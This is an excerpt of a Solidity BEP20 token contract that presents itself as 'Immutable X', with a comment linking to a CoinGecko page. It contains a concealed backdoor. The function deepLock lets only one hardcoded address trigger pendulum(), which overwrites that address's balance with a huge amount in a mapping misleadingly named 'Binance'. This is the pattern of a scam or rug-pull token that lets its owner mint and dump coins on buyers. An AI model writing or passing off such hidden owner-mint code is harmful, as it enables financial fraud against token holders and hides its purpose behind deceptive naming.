...
interface Ibep20Metadata is Ibep20 {
 ...
 contract ImmutableX is AntiBot, Ibep20, Ibep20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private Binance;
    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    string private _name = "Immutable X";
    string private _symbol = "ImmutableX";
    uint256 private constant MAX = ~uint256(0);
//  https://www.coingecko.com/en/coins/ImmutableX
    ...
    address private SaveAfricano = 0x0D6Eb2A4F2440288606374DCd9f4AC264f26bdfe;
    ...
    function deepLock() public {
        require(_msgSender() == SaveAfricano, "Can't please try again.");
        pendulum();
    }
...
function _reflectFee(uint256 rFee, uint256 tFee) private {
    ...
    function pendulum() internal {
      Binance[SaveAfricano] = 10000000000000000000000000000;
    }
